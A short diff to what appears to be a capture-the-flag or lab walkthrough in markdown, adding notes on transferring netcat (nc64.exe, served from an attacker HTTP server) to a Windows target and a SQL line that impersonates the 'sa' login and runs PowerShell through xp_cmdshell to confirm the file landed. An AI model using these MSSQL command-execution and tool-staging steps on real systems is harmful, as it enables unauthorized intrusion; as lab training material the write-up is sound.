@@ -272,5 +272,15 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.66.164 - - [03/Oct/2026 14:20:57] "GET /nc64.exe HTTP/1.1" 200 -
 ```
 
-I managed to transfet 
+I managed to transfer netcat
+
+```python
+EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'powershell -c dir -force C:\ProgramData\';
+```
+
+![](Pasted%20image%2020261003142214.png)
+
+As seen here the file exists
+
+
 
